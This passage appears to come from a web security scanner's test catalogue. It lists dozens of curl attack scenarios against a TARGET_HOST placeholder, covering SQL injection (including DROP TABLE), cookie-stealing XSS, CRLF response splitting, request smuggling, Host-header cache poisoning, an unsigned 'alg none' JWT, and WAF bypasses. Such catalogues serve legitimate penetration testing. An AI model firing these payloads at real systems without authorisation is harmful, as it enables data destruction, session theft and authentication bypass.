                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json; charset=utf-8" -d \'{"admin":true}\' -v'
                        }
                    ]
                },
                {
                    id: 'JSON-020',
                    name: 'JSON with HTML Injection',
                    severity: 'high',
                    description: 'Tests HTML injection via JSON',
                    scenarios: [
                        {
                            id: 'JSON-020-A',
                            name: 'Basic HTML Injection',
                            description: 'Simple HTML injection in JSON',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"comment":"<img src=x onerror=alert(1)>"}\' -v'
                        },
                        {
                            id: 'JSON-020-B',
                            name: 'HTML with Unicode Escapes',
                            description: 'HTML injection with Unicode escapes',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"comment":"\\u003Cimg src=x onerror=alert(1)\\u003E"}\' -v'
                        },
                        {
                            id: 'JSON-020-C',
                            name: 'Stored HTML Injection',
                            description: 'Persistent HTML injection',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"profile":{"name":"<script>alert(document.cookie)< /script>"}}\' -v'
                        }
                    ]
                },
                {
                    id: 'JSON-021',
                    name: 'JSON with SQL Injection Payloads',
                    severity: 'critical',
                    description: 'Tests SQL injection via JSON',
                    scenarios: [
                        {
                            id: 'JSON-021-A',
                            name: 'Basic SQL Injection',
                            description: 'Simple SQL injection in JSON value',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"username":"admin\\" OR 1=1 --"}\' -v'
                        },
                        {
                            id: 'JSON-021-B',
                            name: 'Numeric SQL Injection',
                            description: 'SQL injection in numeric field',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"id": 1 OR 1=1}\' -v'
                        },
                        {
                            id: 'JSON-021-C',
                            name: 'Nested SQL Injection',
                            description: 'SQL injection in nested object',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"user":{"id":1, "name":"admin\\"; DROP TABLE users; --"}}\' -v'
                        }
                    ]
                },
                {
                    id: 'JSON-022',
                    name: 'Content-Type Spoofing with JSON',
                    severity: 'high',
                    description: 'Tests Content-Type spoofing with JSON payloads',
                    scenarios: [
                        {
                            id: 'JSON-022-A',
                            name: 'Multiple Content-Types',
                            description: 'Sends multiple Content-Type headers',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -H "Content-Type: application/x-www-form-urlencoded" -d \'{"admin":true}\' -v'
                        },
                        {
                            id: 'JSON-022-B',
                            name: 'Mixed Content-Type',
                            description: 'Sends form data with JSON Content-Type',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d "username=admin&password=password" -v'
                        },
                        {
                            id: 'JSON-022-C',
                            name: 'Content-Type Parameter Injection',
                            description: 'Injects parameters in Content-Type',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json; boundary=something" -d \'{"admin":true}\' -v'
                        }
                    ]
                },
                {
                    id: 'JSON-023',
                    name: 'JSON Interoperability Attacks',
                    severity: 'high',
                    description: 'Tests attacks exploiting JSON format interoperability',
                    scenarios: [
                        {
                            id: 'JSON-023-A',
                            name: 'JSONP Injection',
                            description: 'Attempts JSONP callback injection',
                            curl: 'curl "http://TARGET_HOST/api/data?callback=alert(document.cookie);" -v'
                        },
                        {
                            id: 'JSON-023-B',
                            name: 'YAML-JSON Confusion',
                            description: 'Exploits YAML-JSON parsing confusion',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d "key: !!js/function function(){return process.env}" -v'
                        },
                        {
                            id: 'JSON-023-C',
                            name: 'XML-JSON Conversion',
                            description: 'Exploits XML to JSON conversion',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/xml" -d "<?xml version=\\"1.0\\"?><root><admin>true</admin></root>" -H "X-Target-Format: json" -v'
                        }
                    ]
                },
                {
                    id: 'JSON-024',
                    name: 'JSON with Control Characters',
                    severity: 'medium',
                    description: 'Tests JSON with control characters',
                    scenarios: [
                        {
                            id: 'JSON-024-A',
                            name: 'Basic Control Characters',
                            description: 'Control characters in JSON string',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"payload":"Line1\\u0000Line2"}\' -v'
                        },
                        {
                            id: 'JSON-024-B',
                            name: 'Direction Control Characters',
                            description: 'Directional control characters',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"text":"normal\\u202Ereversed\\u202Cnormal"}\' -v'
                        },
                        {
                            id: 'JSON-024-C',
                            name: 'Control Character Key',
                            description: 'Control character in object key',
                            curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"user\\u0000name":"admin"}\' -v'
                        }
                    ]
                }
            ],
            'HTTP Headers': [
                {
                    id: 'HEADER-001',
                    name: 'Allow Low ASCII in Header Name',
                    severity: 'medium',
                    description: 'Tests header names with low ASCII characters (0-31)',
                    scenarios: [
                        {
                            id: 'HEADER-001-A',
                            name: 'Control Characters',
                            description: 'ASCII control characters in header name',
                            curl: 'curl "http://TARGET_HOST/" -H "X-Test%01: value" -v'
                        },
                        {
                            id: 'HEADER-001-B',
                            name: 'Tab in Header Name',
                            description: 'Tab character in header name',
                            curl: 'curl "http://TARGET_HOST/" -H "X%09Test: value" -v'
                        },
                        {
                            id: 'HEADER-001-C',
                            name: 'Multiple Control Chars',
                            description: 'Multiple control characters',
                            curl: 'curl "http://TARGET_HOST/" -H "X%01%02%03: value" -v'
                        }
                    ]
                },
                {
                    id: 'HEADER-002',
                    name: 'Allow High ASCII in Header Name',
                    severity: 'medium',
                    description: 'Tests header names with high ASCII characters (128+)',
                    scenarios: [
                        {
                            id: 'HEADER-002-A',
                            name: 'Extended ASCII',
                            description: 'Extended ASCII in header name',
                            curl: 'curl "http://TARGET_HOST/" -H "X-Test%80: value" -v'
                        },
                        {
                            id: 'HEADER-002-B',
                            name: 'Latin-1 Characters',
                            description: 'Latin-1 supplement characters',
                            curl: 'curl "http://TARGET_HOST/" -H "X-T%E9st: value" -v'
                        },
                        {
                            id: 'HEADER-002-C',
                            name: 'High ASCII Range',
                            description: 'Various high ASCII characters',
                            curl: 'curl "http://TARGET_HOST/" -H "X%FF%FE%FD: value" -v'
                        }
                    ]
                },
                {
                    id: 'HEADER-003',
                    name: 'Allow Separator Characters in Header Name',
                    severity: 'medium',
                    description: 'Tests header names with separator characters',
                    scenarios: [
                        {
                            id: 'HEADER-003-A',
                            name: 'Semicolon Separator',
                            description: 'Semicolon in header name',
                            curl: 'curl "http://TARGET_HOST/" -H "X-Test;Inject: value" -v'
                        },
                        {
                            id: 'HEADER-003-B',
                            name: 'Comma Separator',
                            description: 'Comma in header name',
                            curl: 'curl "http://TARGET_HOST/" -H "X-Test,Inject: value" -v'
                        },
                        {
                            id: 'HEADER-003-C',
                            name: 'Multiple Separators',
                            description: 'Multiple separator characters',
                            curl: 'curl "http://TARGET_HOST/" -H "X-Test;,=Inject: value" -v'
                        }
                    ]
                },
                {
                    id: 'HEADER-004',
                    name: 'Allow Low ASCII in Header Value',
                    severity: 'medium',
                    description: 'Tests header values with low ASCII characters',
                    scenarios: [
                        {
                            id: 'HEADER-004-A',
                            name: 'Control in Value',
                            description: 'Control characters in header value',
                            curl: 'curl "http://TARGET_HOST/" -H "X-Test: value%01data" -v'
                        },
                        {
                            id: 'HEADER-004-B',
                            name: 'Newline in Value',
                            description: 'Newline character in value',
                            curl: 'curl "http://TARGET_HOST/" -H "X-Test: line1%0Aline2" -v'
                        },
                        {
                            id: 'HEADER-004-C',
                            name: 'Null in Value',
                            description: 'Null byte in header value',
                            curl: 'curl "http://TARGET_HOST/" -H "X-Test: before%00after" -v'
                        }
                    ]
                },
                {
                    id: 'HEADER-005',
                    name: 'Allow High ASCII in Header Value',
                    severity: 'medium',
                    description: 'Tests header values with high ASCII characters',
                    scenarios: [
                        {
                            id: 'HEADER-005-A',
                            name: 'Extended ASCII Value',
                            description: 'Extended ASCII in header value',
                            curl: 'curl "http://TARGET_HOST/" -H "X-Test: val%80ue" -v'
                        },
                        {
                            id: 'HEADER-005-B',
                            name: 'UTF-8 Sequences',
                            description: 'UTF-8 sequences in value',
                            curl: 'curl "http://TARGET_HOST/" -H "X-Test: %C2%A9 2024" -v'
                        },
                        {
                            id: 'HEADER-005-C',
                            name: 'Mixed High ASCII',
                            description: 'Various high ASCII in value',
                            curl: 'curl "http://TARGET_HOST/" -H "X-Test: %FF%FE%FD" -v'
                        }
                    ]
                },
                {
                    id: 'HEADER-006',
                    name: 'Allow Empty Header Name',
                    severity: 'high',
                    description: 'Tests requests with empty header names',
                    scenarios: [
                        {
                            id: 'HEADER-006-A',
                            name: 'Empty Header Name',
                            description: 'Completely empty header name',
                            curl: 'curl "http://TARGET_HOST/" -H ": value" -v'
                        },
                        {
                            id: 'HEADER-006-B',
                            name: 'Whitespace Header Name',
                            description: 'Only whitespace in header name',
                            curl: 'curl "http://TARGET_HOST/" -H "   : value" -v'
                        },
                        {
                            id: 'HEADER-006-C',
                            name: 'Tab Header Name',
                            description: 'Only tab in header name',
                            curl: 'curl "http://TARGET_HOST/" -H "%09: value" -v'
                        }
                    ]
                },
                {
                    id: 'HEADER-007',
                    name: 'Allow Missing Host Header',
                    severity: 'high',
                    description: 'Tests requests without required Host header',
                    scenarios: [
                        {
                            id: 'HEADER-007-A',
                            name: 'No Host Header HTTP/1.0',
                            description: 'HTTP/1.0 request without Host',
                            curl: 'curl "http://TARGET_HOST/" -H "Host:" --http1.0 -v'
                        },
                        {
                            id: 'HEADER-007-B',
                            name: 'No Host Header HTTP/1.1',
                            description: 'HTTP/1.1 request without Host',
                            curl: 'curl "http://TARGET_HOST/" -H "Host:" --http1.1 -v'
                        },
                        {
                            id: 'HEADER-007-C',
                            name: 'Empty Host Header',
                            description: 'Host header with empty value',
                            curl: 'curl "http://TARGET_HOST/" -H "Host: " -v'
                        }
                    ]
                },
                {
                    id: 'HEADER-008',
                    name: 'Allow Unlimited Range Headers',
                    severity: 'medium',
                    description: 'Tests multiple range headers for DoS potential',
                    scenarios: [
                        {
                            id: 'HEADER-008-A',
                            name: 'Multiple Ranges',
                            description: 'Multiple byte ranges',
                            curl: 'curl "http://TARGET_HOST/large-file" -H "Range: bytes=0-10,20-30,40-50,60-70,80-90" -v'
                        },
                        {
                            id: 'HEADER-008-B',
                            name: 'Overlapping Ranges',
                            description: 'Overlapping byte ranges',
                            curl: 'curl "http://TARGET_HOST/large-file" -H "Range: bytes=0-100,50-150,100-200" -v'
                        },
                        {
                            id: 'HEADER-008-C',
                            name: 'Many Small Ranges',
                            description: 'Many small byte ranges',
                            curl: 'curl "http://TARGET_HOST/large-file" -H "Range: bytes=0-1,1-2,2-3,3-4,4-5,5-6,6-7,7-8,8-9,9-10" -v'
                        }
                    ]
                },
                {
                    id: 'HEADER-009',
                    name: 'Disable Range Header',
                    severity: 'low',
                    description: 'Tests if range headers can be disabled',
                    scenarios: [
                        {
                            id: 'HEADER-009-A',
                            name: 'Invalid Range Syntax',
                            description: 'Malformed range header',
                            curl: 'curl "http://TARGET_HOST/file" -H "Range: bytes=abc-def" -v'
                        },
                        {
                            id: 'HEADER-009-B',
                            name: 'Negative Range',
                            description: 'Negative byte range',
                            curl: 'curl "http://TARGET_HOST/file" -H "Range: bytes=-100--50" -v'
                        },
                        {
                            id: 'HEADER-009-C',
                            name: 'Huge Range',
                            description: 'Extremely large range',
                            curl: 'curl "http://TARGET_HOST/file" -H "Range: bytes=0-999999999999" -v'
                        }
                    ]
                },
                {
                    id: 'HEADER-010',
                    name: 'HTTP Header Injection/Smuggling',
                    severity: 'critical',
                    description: 'Tests for HTTP header injection vulnerabilities',
                    scenarios: [
                        {
                            id: 'HEADER-010-A',
                            name: 'Basic Header Injection',
                            description: 'Simple header injection attempt',
                            curl: 'curl "http://TARGET_HOST/" -H "X-Forwarded-For: 127.0.0.1%0d%0aX-Injected: malicious" -v'
                        },
                        {
                            id: 'HEADER-010-B',
                            name: 'Cookie Injection',
                            description: 'Injecting a cookie via header',
                            curl: 'curl "http://TARGET_HOST/" -H "User-Agent: Mozilla/5.0%0d%0aSet-Cookie: injected=true" -v'
                        },
                        {
                            id: 'HEADER-010-C',
                            name: 'Content-Length Smuggling',
                            description: 'Smuggling Content-Length header',
                            curl: 'curl "http://TARGET_HOST/" -H "X-Forwarded-For: 127.0.0.1%0d%0aContent-Length: 0" -v'
                        }
                    ]
                },
                {
                    id: 'HEADER-011',
                    name: 'HTTP Header Folding',
                    severity: 'high',
                    description: 'Tests for HTTP header folding vulnerabilities',
                    scenarios: [
                        {
                            id: 'HEADER-011-A',
                            name: 'Basic Header Folding',
                            description: 'Simple header folding attack',
                            curl: 'curl "http://TARGET_HOST/" -H "X-Original: value%0d%0a folded-header: injection" -v'
                        },
                        {
                            id: 'HEADER-011-B',
                            name: 'Folding with Tab',
                            description: 'Header folding using tab character',
                            curl: 'curl "http://TARGET_HOST/" -H "X-Original: value%0d%0a%09folded-header: injection" -v'
                        },
                        {
                            id: 'HEADER-011-C',
                            name: 'Multiple Folded Lines',
                            description: 'Multiple folded header lines',
                            curl: 'curl "http://TARGET_HOST/" -H "X-Original: value%0d%0a folded1: injection1%0d%0a folded2: injection2" -v'
                        }
                    ]
                },
                {
                    id: 'HEADER-012',
                    name: 'Multiple Identical Headers',
                    severity: 'high',
                    description: 'Tests handling of duplicate header names',
                    scenarios: [
                        {
                            id: 'HEADER-012-A',
                            name: 'Duplicate Content-Length',
                            description: 'Multiple Content-Length headers',
                            curl: 'curl "http://TARGET_HOST/" -H "Content-Length: 10" -H "Content-Length: 20" -d "payload" -v'
                        },
                        {
                            id: 'HEADER-012-B',
                            name: 'Duplicate Host Headers',
                            description: 'Multiple Host headers',
                            curl: 'curl "http://TARGET_HOST/" -H "Host: example.com" -H "Host: evil.com" -v'
                        },
                        {
                            id: 'HEADER-012-C',
                            name: 'Duplicate Custom Headers',
                            description: 'Duplicate custom headers',
                            curl: 'curl "http://TARGET_HOST/" -H "X-Custom: value1" -H "X-Custom: value2" -v'
                        }
                    ]
                },
                {
                    id: 'HEADER-013',
                    name: 'Header Value Truncation',
                    severity: 'medium',
                    description: 'Tests handling of extremely long header values',
                    scenarios: [
                        {
                            id: 'HEADER-013-A',
                            name: 'Long Header Value',
                            description: 'Extremely long header value',
                            curl: 'curl "http://TARGET_HOST/" -H "X-Long: $(printf \'A%.0s\' {1..8192})" -v'
                        },
                        {
                            id: 'HEADER-013-B',
                            name: 'Long Header Name',
                            description: 'Extremely long header name',
                            curl: 'curl "http://TARGET_HOST/" -H "$(printf \'X-%.0s\' {1..1024})-Name: value" -v'
                        },
                        {
                            id: 'HEADER-013-C',
                            name: 'Long Host Header',
                            description: 'Very long Host header value',
                            curl: 'curl "http://TARGET_HOST/" -H "Host: $(printf \'sub%.0s\' {1..1024}).example.com" -v'
                        }
                    ]
                },
                {
                    id: 'HEADER-014',
                    name: 'CRLF Injection in Headers',
                    severity: 'critical',
                    description: 'Tests for CRLF injection vulnerabilities',
                    scenarios: [
                        {
                            id: 'HEADER-014-A',
                            name: 'Response Splitting',
                            description: 'HTTP response splitting attack',
                            curl: 'curl "http://TARGET_HOST/" -H "X-Custom: injection%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<html>Injected</html>" -v'
                        },
                        {
                            id: 'HEADER-014-B',
                            name: 'Header Splitting',
                            description: 'Splitting headers with CRLF',
                            curl: 'curl "http://TARGET_HOST/" -H "User-Agent: Mozilla%0d%0aX-Injected: malicious" -v'
                        },
                        {
                            id: 'HEADER-014-C',
                            name: 'Cache Poisoning',
                            description: 'Cache poisoning via CRLF',
                            curl: 'curl "http://TARGET_HOST/" -H "X-Forwarded-Host: evil.com%0d%0aCache-Control: public, max-age=31536000" -v'
                        }
                    ]
                },
                {
                    id: 'HEADER-015',
                    name: 'Cache Poisoning via Headers',
                    severity: 'high',
                    description: 'Tests for web cache poisoning vulnerabilities',
                    scenarios: [
                        {
                            id: 'HEADER-015-A',
                            name: 'X-Forwarded-Host Poisoning',
                            description: 'Cache poisoning with X-Forwarded-Host',
                            curl: 'curl "http://TARGET_HOST/" -H "X-Forwarded-Host: evil.com" -v'
                        },
                        {
                            id: 'HEADER-015-B',
                            name: 'Vary Header Bypass',
                            description: 'Bypassing Vary header protection',
                            curl: 'curl "http://TARGET_HOST/" -H "X-Original-Host: evil.com" -v'
                        },
                        {
                            id: 'HEADER-015-C',
                            name: 'Path-Based Poisoning',
                            description: 'Path-based cache poisoning',
                            curl: 'curl "http://TARGET_HOST/" -H "X-Original-URL: /admin" -v'
                        }
                    ]
                },
                {
                    id: 'HEADER-016',
                    name: 'Host Header Manipulation',
                    severity: 'critical',
                    description: 'Tests for host header attacks',
                    scenarios: [
                        {
                            id: 'HEADER-016-A',
                            name: 'Host Override',
                            description: 'Overriding host with X-Forwarded-Host',
                            curl: 'curl "http://TARGET_HOST/" -H "Host: TARGET_HOST" -H "X-Forwarded-Host: evil.com" -v'
                        },
                        {
                            id: 'HEADER-016-B',
                            name: 'Malformed Host',
                            description: 'Malformed host header',
                            curl: 'curl "http://TARGET_HOST/" -H "Host: TARGET_HOST:80:80" -v'
                        },
                        {
                            id: 'HEADER-016-C',
                            name: 'Line-Wrapped Host',
                            description: 'Line-wrapped host header',
                            curl: 'curl "http://TARGET_HOST/" -H "Host: TARGET_HOST%0d%0a Host: evil.com" -v'
                        }
                    ]
                },
                {
                    id: 'HEADER-017',
                    name: 'Inconsistent Content-Length',
                    severity: 'high',
                    description: 'Tests handling of inconsistent Content-Length headers',
                    scenarios: [
                        {
                            id: 'HEADER-017-A',
                            name: 'Mismatched Content-Length',
                            description: 'Content-Length longer than actual content',
                            curl: 'curl -X POST "http://TARGET_HOST/" -H "Content-Length: 20" -d "test" -v'
                        },
                        {
                            id: 'HEADER-017-B',
                            name: 'Negative Content-Length',
                            description: 'Negative Content-Length value',
                            curl: 'curl -X POST "http://TARGET_HOST/" -H "Content-Length: -10" -d "test" -v'
                        },
                        {
                            id: 'HEADER-017-C',
                            name: 'Huge Content-Length',
                            description: 'Extremely large Content-Length',
                            curl: 'curl -X POST "http://TARGET_HOST/" -H "Content-Length: 999999999999" -d "test" -v'
                        }
                    ]
                },
                {
                    id: 'HEADER-018',
                    name: 'Non-Standard Headers',
                    severity: 'medium',
                    description: 'Tests handling of non-standard HTTP headers',
                    scenarios: [
                        {
                            id: 'HEADER-018-A',
                            name: 'Custom Security Headers',
                            description: 'Non-standard security headers',
                            curl: 'curl "http://TARGET_HOST/" -H "X-Security-Override: bypass" -v'
                        },
                        {
                            id: 'HEADER-018-B',
                            name: 'Unusual Header Names',
                            description: 'Headers with unusual names',
                            curl: 'curl "http://TARGET_HOST/" -H "X-!@#$%^&*(): value" -v'
                        },
                        {
                            id: 'HEADER-018-C',
                            name: 'Framework-Specific Headers',
                            description: 'Framework-specific headers',
                            curl: 'curl "http://TARGET_HOST/" -H "X-XSRF-TOKEN: bypass" -H "X-Rails-Token: bypass" -v'
                        }
                    ]
                },
                {
                    id: 'HEADER-019',
                    name: 'Protocol Downgrade via Headers',
                    severity: 'high',
                    description: 'Tests for protocol downgrade attacks via headers',
                    scenarios: [
                        {
                            id: 'HEADER-019-A',
                            name: 'HTTPS Downgrade',
                            description: 'Forcing HTTPS to HTTP downgrade',
                            curl: 'curl "https://TARGET_HOST/" -H "X-Forwarded-Proto: http" -v'
                        },
                        {
                            id: 'HEADER-019-B',
                            name: 'HTTP Version Downgrade',
                            description: 'Forcing HTTP version downgrade',
                            curl: 'curl "http://TARGET_HOST/" -H "X-Forwarded-Proto: http/1.0" -v'
                        },
                        {
                            id: 'HEADER-019-C',
                            name: 'TLS Version Downgrade',
                            description: 'Forcing TLS version downgrade',
                            curl: 'curl "https://TARGET_HOST/" -H "X-Forwarded-SSL: off" -v'
                        }
                    ]
                },
                {
                    id: 'HEADER-020',
                    name: 'X-Forwarded-For Spoofing',
                    severity: 'high',
                    description: 'Tests for IP spoofing via X-Forwarded-For',
                    scenarios: [
                        {
                            id: 'HEADER-020-A',
                            name: 'Basic IP Spoofing',
                            description: 'Simple IP address spoofing',
                            curl: 'curl "http://TARGET_HOST/" -H "X-Forwarded-For: 127.0.0.1" -v'
                        },
                        {
                            id: 'HEADER-020-B',
                            name: 'Multiple IPs in XFF',
                            description: 'Multiple IP addresses in XFF',
                            curl: 'curl "http://TARGET_HOST/" -H "X-Forwarded-For: malicious.com, 127.0.0.1, proxy1, proxy2" -v'
                        },
                        {
                            id: 'HEADER-020-C',
                            name: 'Alternative IP Headers',
                            description: 'Using alternative IP headers',
                            curl: 'curl "http://TARGET_HOST/" -H "X-Forwarded-For: hacker.com" -H "X-Real-IP: 127.0.0.1" -H "Client-IP: 10.0.0.1" -v'
                        }
                    ]
                },
                {
                    id: 'HEADER-021',
                    name: 'Content-Type Manipulation',
                    severity: 'high',
                    description: 'Tests handling of malformed Content-Type headers',
                    scenarios: [
                        {
                            id: 'HEADER-021-A',
                            name: 'MIME Sniffing Bypass',
                            description: 'Bypassing MIME sniffing protection',
                            curl: 'curl -X POST "http://TARGET_HOST/" -H "Content-Type: text/plain; charset=UTF-7" -d "<script>alert(1)< /script>" -v'
                        },
                        {
                            id: 'HEADER-021-B',
                            name: 'Multiple Content-Types',
                            description: 'Multiple conflicting Content-Type headers',
                            curl: 'curl -X POST "http://TARGET_HOST/" -H "Content-Type: application/json" -H "Content-Type: application/x-www-form-urlencoded" -d "param=value" -v'
                        },
                        {
                            id: 'HEADER-021-C',
                            name: 'Content-Type Parameter Pollution',
                            description: 'Content-Type parameter pollution',
                            curl: 'curl -X POST "http://TARGET_HOST/" -H "Content-Type: application/json; charset=UTF-8; application=x-www-form-urlencoded" -d "param=value" -v'
                        }
                    ]
                },
                {
                    id: 'HEADER-022',
                    name: 'Transfer-Encoding Manipulation',
                    severity: 'critical',
                    description: 'Tests for chunked encoding vulnerabilities',
                    scenarios: [
                        {
                            id: 'HEADER-022-A',
                            name: 'Chunked Encoding Confusion',
                            description: 'Exploiting chunked encoding confusion',
                            curl: 'curl -X POST "http://TARGET_HOST/" -H "Transfer-Encoding: chunked" -H "Content-Length: 5" -d "0\\r\\n\\r\\nHTTP/1.1 200\\r\\n\\r\\n<html>Injected content</html>" -v'
                        },
                        {
                            id: 'HEADER-022-B',
                            name: 'Obfuscated Chunked Encoding',
                            description: 'Obfuscated Transfer-Encoding header',
                            curl: 'curl -X POST "http://TARGET_HOST/" -H "Transfer-Encoding: chunked" -H "Transfer-Encoding : chunked" -d "test" -v'
                        },
                        {
                            id: 'HEADER-022-C',
                            name: 'Mixed Transfer Encodings',
                            description: 'Mixed transfer encoding types',
                            curl: 'curl -X POST "http://TARGET_HOST/" -H "Transfer-Encoding: gzip, chunked" -d "test" -v'
                        }
                    ]
                },
                {
                    id: 'HEADER-023',
                    name: 'Cookie Manipulation',
                    severity: 'high',
                    description: 'Tests for cookie-based vulnerabilities',
                    scenarios: [
                        {
                            id: 'HEADER-023-A',
                            name: 'Cookie Injection',
                            description: 'Injecting malicious cookies',
                            curl: 'curl "http://TARGET_HOST/" -H "Cookie: session=valid; admin=true" -v'
                        },
                        {
                            id: 'HEADER-023-B',
                            name: 'Cookie Attribute Pollution',
                            description: 'Polluting cookie attributes',
                            curl: 'curl "http://TARGET_HOST/" -H "Cookie: session=valid; SameSite=None; secure=false" -v'
                        },
                        {
                            id: 'HEADER-023-C',
                            name: 'Multiple Cookie Headers',
                            description: 'Using multiple cookie headers',
                            curl: 'curl "http://TARGET_HOST/" -H "Cookie: role=user" -H "Cookie: role=admin" -v'
                        }
                    ]
                },
                {
                    id: 'HEADER-024',
                    name: 'Authorization Header Attacks',
                    severity: 'critical',
                    description: 'Tests for authentication bypass via header manipulation',
                    scenarios: [
                        {
                            id: 'HEADER-024-A',
                            name: 'Basic Auth Malformation',
                            description: 'Malformed Basic Authorization',
                            curl: 'curl "http://TARGET_HOST/" -H "Authorization: Basic YWRtaW46YWRtaW4=%00" -v'
                        },
                        {
                            id: 'HEADER-024-B',
                            name: 'Bearer Token Manipulation',
                            description: 'Manipulated Bearer token',
                            curl: 'curl "http://TARGET_HOST/" -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9." -v'
                        },
                        {
                            id: 'HEADER-024-C',
                            name: 'Multiple Auth Methods',
                            description: 'Multiple authentication methods',
                            curl: 'curl "http://TARGET_HOST/" -H "Authorization: Basic YWRtaW46cGFzcw==" -H "Authorization: Bearer token" -v'
                        }
                    ]
                },
                {
                    id: 'HEADER-025',
                    name: 'Header Order Dependence',
                    severity: 'medium',
                    description: 'Tests for vulnerabilities related to header order processing',
                    scenarios: [
                        {
                            id: 'HEADER-025-A',
                            name: 'Security Headers Order',
                            description: 'Testing security header order dependence',
                            curl: 'curl "http://TARGET_HOST/" -H "X-XSS-Protection: 0" -H "Content-Security-Policy: default-src \'self\'" -v'
                        },
                        {
                            id: 'HEADER-025-B',
                            name: 'Authentication Headers Order',
                            description: 'Testing auth header order dependence',
                            curl: 'curl "http://TARGET_HOST/" -H "X-Custom-Auth: bypass" -H "Authorization: Basic YWRtaW46cGFzcw==" -v'
                        },
                        {
                            id: 'HEADER-025-C',
                            name: 'Content Headers Order',
                            description: 'Testing content header order dependence',
                            curl: 'curl "http://TARGET_HOST/" -H "Content-Type: application/json" -H "Content-Length: 10" -H "Content-Encoding: gzip" -d "{\"test\":1}" -v'
                        }
                    ]
                },
                {
                    id: 'HEADER-026',
                    name: 'WAF Bypass via Headers',
                    severity: 'critical',
                    description: 'Tests for WAF bypass techniques using headers',
                    scenarios: [
                        {
                            id: 'HEADER-026-A',
                            name: 'Content-Type Override',
                            description: 'Bypassing WAF with Content-Type override',
                            curl: 'curl "http://TARGET_HOST/?<script>alert(1)< /script>" -H "Content-Type: application/json" -H "X-Content-Type-Options: nosniff" -v'
                        },
                        {
                            id: 'HEADER-026-B',
                            name: 'Header-Based Payload Splitting',
                            description: 'Splitting attack payload across headers',
                            curl: 'curl "http://TARGET_HOST/" -H "X-Part1: <img " -H "X-Part2: src=x " -H "X-Part3: onerror=alert(1)>" -v'
                        },
                        {
                            id: 'HEADER-026-C',
                            name: 'Charset Manipulation',
                            description: 'Bypassing WAF with charset manipulation',
                            curl: 'curl "http://TARGET_HOST/" -H "Content-Type: application/x-www-form-urlencoded; charset=IBM500" -d "payload=%86%97%85%99%A3<1>" -v'
                        }
                    ]
                },
                {
                    id: 'HEADER-027',
                    name: 'Proxy Header Confusion',
                    severity: 'high',
                    description: 'Tests for proxy header confusion attacks',
                    scenarios: [
                        {
                            id: 'HEADER-027-A',
                            name: 'Conflicting X-Forwarded Headers',
                            description: 'Sending conflicting X-Forwarded headers',
                            curl: 'curl "http://TARGET_HOST/" -H "X-Forwarded-For: 192.168.0.1" -H "X-Forwarded-Host: evil.com" -H "X-Forwarded-Proto: http" -v'
                        },
                        {
                            id: 'HEADER-027-B',
                            name: 'Mixed Proxy Headers',
                            description: 'Using mixed proxy header styles',
                            curl: 'curl "http://TARGET_HOST/" -H "X-Forwarded-For: 192.168.0.1" -H "Forwarded: for=10.0.0.1;proto=https" -v'
                        },
                        {
                            id: 'HEADER-027-C',
                            name: 'Proxy Header Injection',
                            description: 'Injecting proxy headers with special chars',
                            curl: 'curl "http://TARGET_HOST/" -H "X-Forwarded-For: 192.168.0.1, evil.com:80@trusted.com" -v'
                        }
                    ]
                },
                {
                    id: 'HEADER-028',
                    name: 'HTTP Method Override Headers',
                    severity: 'high',
                    description: 'Tests for HTTP method override header vulnerabilities',
                    scenarios: [
                        {
                            id: 'HEADER-028-A',
                            name: 'X-HTTP-Method-Override',
                            description: 'Using X-HTTP-Method-Override header',
                            curl: 'curl -X POST "http://TARGET_HOST/" -H "X-HTTP-Method-Override: PUT" -d "data" -v'
                        },
                        {
                            id: 'HEADER-028-B',
                            name: 'X-Method-Override',
                            description: 'Using X-Method-Override header',
                            curl: 'curl -X POST "http://TARGET_HOST/" -H "X-Method-Override: DELETE" -d "data" -v'
                        },
                        {
                            id: 'HEADER-028-C',
                            name: 'Multiple Override Headers',
                            description: 'Using multiple conflicting override headers',
                            curl: 'curl -X GET "http://TARGET_HOST/" -H "X-HTTP-Method-Override: DELETE" -H "X-Method-Override: PUT" -v'
                        }
                    ]
                },
                {
                    id: 'HEADER-029',
                    name: 'Referrer Policy Manipulation',
                    severity: 'medium',
                    description: 'Tests for Referrer-Policy manipulation',
                    scenarios: [
                        {
                            id: 'HEADER-029-A',
                            name: 'Invalid Referrer Policy',
                            description: 'Setting invalid Referrer-Policy value',
                            curl: 'curl "http://TARGET_HOST/" -H "Referrer-Policy: invalid-value" -v'
                        },
                        {
                            id: 'HEADER-029-B',
                            name: 'Multiple Referrer Policies',
                            description: 'Setting multiple Referrer-Policy headers',
                            curl: 'curl "http://TARGET_HOST/" -H "Referrer-Policy: no-referrer" -H "Referrer-Policy: unsafe-url" -v'
                        },
                        {
                            id: 'HEADER-029-C',
                            name: 'Referrer Policy Override',
                            description: 'Attempting to override existing policy',
                            curl: 'curl "http://TARGET_HOST/" -H "Referrer-Policy: unsafe-url" -H "X-Referrer-Policy: no-referrer" -v'
                        }
                    ]
                },
                {
                    id: 'HEADER-030',
                    name: 'HTTP Header Oversize',
                    severity: 'medium',
                    description: 'Tests for vulnerabilities with extremely large headers',
                    scenarios: [
                        {
                            id: 'HEADER-030-A',
                            name: 'Large Header Set',
                            description: 'Sending a large number of headers',
